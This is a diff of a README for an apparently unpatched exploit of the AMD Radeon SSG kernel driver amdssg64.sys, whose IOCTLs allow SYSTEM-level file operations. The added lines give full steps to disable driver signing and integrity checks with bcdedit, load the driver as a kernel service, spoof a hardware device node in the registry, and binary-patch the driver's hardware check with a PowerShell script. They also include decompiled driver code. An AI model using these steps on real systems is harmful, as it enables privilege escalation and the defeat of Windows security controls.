@@ -5,12 +5,35 @@ This is not a known exploit nor is it patched yet. amdssg64.sys (AMD Radeon SSG 
 
 The driver is a WDF (KMDF) PnP driver originally built for AMD's Radeon SSG (Solid State Graphics) PCIe cards featuring onboard flash storage. It was designed to let AMD's usermode software perform direct file I/O through the kernel for high-bandwidth data transfers to the SSG's local storage. However, the IOCTL interface has no access control — any process that can open the device handle can issue file operations as SYSTEM.
 
-The driver validates that AMD SSG hardware (`DEV_7300` or `DEV_6862`) is present via `IoGetDeviceInterfaces` before processing file operations. This requires a system with the matching hardware or a spoofed device node to satisfy the check.
-
 **Tested on Windows 10 22H2.** Newer versions of Windows may block loading the driver due to driver signing policy changes.
 
+# Hardware Validation
+The driver performs a runtime hardware check (`sub_140001600`) on every file open IOCTL by calling `IoGetDeviceInterfaces` and searching the returned device interface strings for specific AMD PCI device IDs. The following hardware is required:
+
+- **AMD Radeon SSG** — PCI Device ID `DEV_7300` (revision `0xCC`)
+- **AMD Radeon Pro** — PCI Device ID `DEV_6862`
+
+These are AMD Radeon Pro / SSG series GPUs with onboard SSD storage. Without one of these cards physically installed (or the check patched out), all file IOCTLs will fail with `STATUS_DEVICE_DOES_NOT_EXIST`.
+
+If you do not have the required hardware, see **Step 4** below to patch the validation out of the driver.
+
 # How To Use
-### Step 1 — Install the Driver
+
+### Note 
+```
+Unless you have AMD Radeon SSG or AMD Radeon Pro this exploit wil not work for you. If your wanting to test if this exploit does work in general. You can follow these steps, this will not hold up against edr or any av unles
+you have the correct PCI Device needed for this driver!
+```
+
+### Step 1 — Enable Test Signing
+```
+bcdedit /set testsigning on
+bcdedit /set nointegritychecks on
+bcdedit /set loadoptions DDISABLE_INTEGRITY_CHECKS
+shutdown /r /t 0
+```
+
+### Step 2 — Install the Driver
 After reboot, copy `amdssg64.sys` and create the kernel service:
 ```
 copy amdssg64.sys C:\Windows\System32\drivers\amdssg64.sys
@@ -18,7 +41,7 @@ sc create SSG binpath="C:\Windows\System32\drivers\amdssg64.sys" type=kernel
 ```
 
 ### Step 3 — Spoof the AMD SSG Device Node
-The driver is a PnP driver — it will only create its device interface when Windows enumerates a matching hardware device. Without an actual AMD Radeon SSG card, you need to create a fake device node in the registry so PnP binds the driver:
+The driver is a PnP driver — it will only create its device interface when Windows enumerates a matching hardware device. Without an actual AMD Radeon SSG card, you need to create a fake device node in the registry so PnP binds the driver and registers the device interface:
 ```
 reg add "HKLM\SYSTEM\CurrentControlSet\Enum\Root\SYSTEM\0001" /v HardwareID /t REG_MULTI_SZ /d "PCI\VEN_1002&DEV_7300&REV_CC" /f
 reg add "HKLM\SYSTEM\CurrentControlSet\Enum\Root\SYSTEM\0001" /v Service /t REG_SZ /d "SSG" /f
@@ -29,12 +52,38 @@ reg add "HKLM\SYSTEM\CurrentControlSet\Enum\Root\SYSTEM\0001" /v ConfigFlags /t 
 reg add "HKLM\SYSTEM\CurrentControlSet\Enum\Root\SYSTEM\0001" /v DeviceDesc /t REG_SZ /d "AMD Radeon SSG" /f
 ```
 
-### Step 4 — Reboot and Start
+Reboot after adding the registry entries:
 ```
 shutdown /r /t 0
 ```
-After reboot:
+
+### Step 4 — Patch Hardware Validation (No AMD SSG Hardware)
+If you do not have an AMD Radeon SSG (`DEV_7300`) or Radeon Pro (`DEV_6862`) GPU, the driver's runtime hardware check will reject all file IOCTLs. Patch `sub_140001600` to always return 1 (hardware found):
+
+**Make sure the driver service is stopped/deleted first:**
 ```
+sc delete SSG
+shutdown /r /t 0
+```
+
+**After reboot, patch the driver in PowerShell (admin):**
+```powershell
+$file = "C:\Windows\System32\drivers\amdssg64.sys"
+$bytes = [System.IO.File]::ReadAllBytes($file)
+$e_lfanew = [BitConverter]::ToInt32($bytes, 0x3C)
+$optHdrSize = [BitConverter]::ToInt16($bytes, $e_lfanew + 20)
+$secTable = $e_lfanew + 24 + $optHdrSize
+$secVA = [BitConverter]::ToInt32($bytes, $secTable + 12)
+$secRaw = [BitConverter]::ToInt32($bytes, $secTable + 20)
+$offset = $secRaw + (0x1600 - $secVA)
+$bytes[$offset] = 0xB0; $bytes[$offset+1] = 0x01; $bytes[$offset+2] = 0xC3
+[System.IO.File]::WriteAllBytes($file, $bytes)
+Write-Host "Patched sub_140001600 -> mov al, 1; ret at offset 0x$($offset.ToString('X'))"
+```
+
+**Recreate the service and start:**
+```
+sc create SSG binpath="C:\Windows\System32\drivers\amdssg64.sys" type=kernel
 sc start SSG
 ```
 
@@ -45,7 +94,7 @@ reg query "HKLM\SYSTEM\CurrentControlSet\Control\DeviceClasses\{EBD5EFC4-27AD-4C
 ```
 
 ### Step 6 — Run
-Compile the project and run the executable. The output should show a valid device handle.
+Compile the project and run the executable. The output should show a valid device handle and successful file I/O operations.
 
 # Driver Details
 
@@ -110,7 +159,7 @@ else
   v13 = ZwWriteFile(v12, 0LL, ApcRoutine, v11, IoStatusBlock, Buffer, Length, &ByteOffset, 0LL);
 ```
 
-**Hardware Validation**
+**Hardware Validation (sub_140001600)**
 ```
 IoGetDeviceInterfaces(&InterfaceClassGuid, 0LL, 0, &SymbolicLinkList);
 // Searches for DEV_7300 (rev CC) and DEV_6862 in device interface strings
